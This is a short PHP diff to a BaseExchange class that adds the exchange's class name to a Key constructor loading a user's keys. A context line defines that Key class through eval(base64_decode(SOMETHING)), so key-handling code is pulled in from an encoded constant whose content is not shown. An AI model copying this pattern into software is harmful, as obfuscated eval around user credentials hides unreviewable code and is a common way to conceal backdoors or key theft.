@@ -18,8 +18,10 @@ abstract class BaseExchange
         if (!class_exists('Key')) {
             eval(base64_decode(SOMETHING));
         }
+        
+        $exchange_class_name = (new \ReflectionClass($this))->getShortName();
 
-        $this->userKeys = new \Key($user_id);
+        $this->userKeys = new \Key($user_id, $exchange_class_name);
 
         if (!$this->userKeys->is_find) {
             UserLog::add([
